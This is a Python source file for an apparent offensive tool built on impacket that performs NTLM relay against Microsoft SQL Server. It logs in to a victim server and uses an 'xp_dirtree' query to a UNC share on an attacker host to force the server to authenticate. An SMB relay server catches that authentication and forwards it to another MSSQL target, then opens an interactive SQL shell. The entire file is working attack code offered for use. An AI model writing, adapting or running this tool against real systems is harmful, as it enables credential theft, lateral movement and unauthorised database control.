import argparse
import random
import string
import sys
import time
import traceback

from impacket import tds
from impacket.examples.mssqlshell import SQLSHELL
from impacket.examples.ntlmrelayx.attacks.mssqlattack import MSSQLAttack
from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

from mssqlrelay.lib.target import Target
from mssqlrelay.lib.logger import logging


class MyMSSQLAttackClient(MSSQLAttack):
    def __init__(self, mssql_relay, config, client, username):
        super().__init__(config, client, username)
        self.mssql_relay = mssql_relay

    def run(self):
        # do stuff
        shell = SQLSHELL(self.client)
        shell.cmdloop()
        self.mssql_relay.shutdown()


class MSSQLRelay:
    def __init__(
            self,
            options
    ):
        self.victimtarget = Target.from_options(options)
        self.domain = self.victimtarget.domain
        self.username = self.victimtarget.username
        self.password = self.victimtarget.password
        self.victim = self.victimtarget.target_ip
        self.hashes = options.hashes
        self.aesKey = options.aes
        self.dc_ip = options.dc_ip
        self.windows_auth = options.windows_auth
        self.mssql_port = options.mssql_port
        self.mssql_db = options.mssql_db
        self.attacker = options.attacker
        self.target = options.relaytarget
        self.listen_interface = options.listen_interface
        self.listen_port = options.listen_port
        self.server = None

    def trigger(self):
        logging.info("Authenticating to victim %s" % self.victim)
        ms_sql = tds.MSSQL(self.victim, int(self.mssql_port))
        ms_sql.connect()

        try:
            if self.aesKey is not None:
                res = ms_sql.kerberosLogin(
                    self.mssql_db,
                    self.username,
                    self.password,
                    self.domain,
                    self.hashes,
                    self.aesKey,
                    kdcHost=self.dc_ip)
            else:
                res = ms_sql.login(
                    self.mssql_db,
                    self.username,
                    self.password,
                    self.domain,
                    self.hashes,
                    self.windows_auth)
            ms_sql.printReplies()
        except Exception as e:
            logging.debug("Exception:", exc_info=True)
            logging.error(str(e))
            res = False

        if res is True:
            path = ''.join(
                [random.choice(string.ascii_letters) for _ in range(8)]
            )
            share = "\\\\%s\\%s" % (self.attacker, path)
            logging.info("Triggering connection to %s" % share)
            ms_sql.sql_query("exec master.sys.xp_dirtree '%s',1,1" % share)
            ms_sql.disconnect()
        else:
            logging.error("Authentication to %s failed" % self.victim)
            self.shutdown()

    def relay(self):
        target = TargetsProcessor(singleTarget="mssql://%s" % self.target)
        config = NTLMRelayxConfig()
        config.setTargets(target)
        config.setAttacks({"MSSQL": self.get_attack_client})
        config.setProtocolClients({"MSSQL": self.get_relay_client})
        config.setListeningPort(self.listen_port)
        config.setInterfaceIp(self.listen_interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)
        logging.info("Listening on %s:%d" % (
            self.listen_interface,
            self.listen_port
        ))

        self.server.start()

    def get_relay_client(self, *args, **kwargs) -> MSSQLRelayClient:
        relay_server = MSSQLRelayClient(*args, **kwargs)
        relay_server.mssql_relay = self
        return relay_server

    def get_attack_client(self, *args, **kwargs) -> MyMSSQLAttackClient:
        return MyMSSQLAttackClient(self, *args, **kwargs)

    def loop(self):
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logging.info("Shutting down")
            self.shutdown()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
            self.shutdown()

    def shutdown(self):
        logging.info("Exiting...")
        if self.server:
            self.server.server.server_close()
        sys.exit(0)

def entry(options: argparse.Namespace) -> None:
    relay = MSSQLRelay(options)
    relay.relay()
    relay.trigger()
    relay.loop()